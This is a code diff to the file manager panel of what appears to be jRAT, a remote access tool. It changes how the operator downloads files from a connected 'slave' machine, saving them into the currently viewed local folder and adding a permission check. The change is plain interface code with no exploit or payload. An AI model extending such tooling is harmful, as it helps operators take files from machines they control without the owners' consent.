@@ -3,6 +3,7 @@ package jrat.module.fs.ui;
 import iconlib.FileIconUtils;
 import jrat.api.Resources;
 import jrat.common.DropLocations;
+import jrat.common.Logger;
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 import jrat.controller.Drive;
@@ -32,6 +33,7 @@ import java.util.List;
 @SuppressWarnings("serial")
 public class PanelFileManager extends FileSubPanel {
 
+    private final LocalFileTable localTable;
 	private final RemoteFileTable remoteTable;
 
 	public PanelFileManager(Slave slave) {
@@ -41,7 +43,7 @@ public class PanelFileManager extends FileSubPanel {
 		
 		final JSplitPane sp = new JSplitPane();
 		
-		LocalFileTable localTable = new LocalFileTable();
+		localTable = new LocalFileTable();
 		sp.setLeftComponent(localTable);
 		
 		remoteTable = new RemoteFileTable();
@@ -504,37 +506,57 @@ public class PanelFileManager extends FileSubPanel {
 			slave.addToSendQueue(new Packet15ListFiles(directory));
 			super.setDirectory(directory);
 		}
-		
-		public void download() {
-			FileObject[] files = getSelectedItems();
-			
-			JFileChooser f = new JFileChooser();
 
-			if (files.length > 1) {
-				f.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
-			}
+        /**
+         * Downloads the selected files from the remote machine
+         *
+         * 1. checks if current local folder user is viewing is writable, saves there
+         * 2. asks user to pick a folder to dump multiple files in, or to pick a file to download to
+         * 3. will warn and break if permission denied
+         */
+		public void download() {
+		    FileObject[] files = getSelectedItems();
+
+			File f = new File(localTable.txtDir.getText());
+
+			if (!f.isDirectory() || !f.canWrite()) {
+                JFileChooser picker = new JFileChooser();
+
+                if (files.length > 1) {
+                    picker.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
+                }
+
+                picker.showSaveDialog(null);
+
+                f = picker.getSelectedFile();
+
+                if (f == null) {
+                    return;
+                }
+            }
 			
-			f.showSaveDialog(null);
-			
-			if (f.getSelectedFile() != null) {
-				for (FileObject fo : files) {
-					TransferData data = new TransferData();
-					if (f.getSelectedFile().isDirectory()) {
-						String name = fo.getPath().substring(fo.getPath().lastIndexOf(slave.getFileSeparator()) + 1, fo.getPath().length());
-							
-						File newFile = new File(f.getSelectedFile(), name);
-						data.setLocalFile(newFile);
-					} else {
-						data.setLocalFile(f.getSelectedFile());
-					}
-					PanelFileTransfers.instance.add(data);
-					FileCache.put(fo.getPath(), data);
-					slave.addToSendQueue(new Packet21Download(fo.getPath()));
-					getParentPanel().setTab(PanelFileTransfers.instance);
-				}
-			}
+
+            for (FileObject fo : files) {
+                TransferData data = new TransferData();
+
+                String filename = f.isFile() ? f.getName() : fo.getPath().substring(fo.getPath().lastIndexOf(slave.getFileSeparator()) + 1, fo.getPath().length());
+
+                File local = new File(f.isDirectory() ? f : f.getParentFile(), filename);
+
+                if (local.exists() && !local.canWrite()) {
+                    Logger.err("permission denied on " + local.getAbsolutePath());
+                    break;
+                }
+
+                data.setLocalFile(local);
+
+                PanelFileTransfers.instance.add(data);
+                FileCache.put(fo.getPath(), data);
+                slave.addToSendQueue(new Packet21Download(fo.getPath()));
+                getParentPanel().setTab(PanelFileTransfers.instance);
+            }
 		}
-	}
+    }
 
 	public RemoteFileTable getRemoteTable() {
 		return remoteTable;
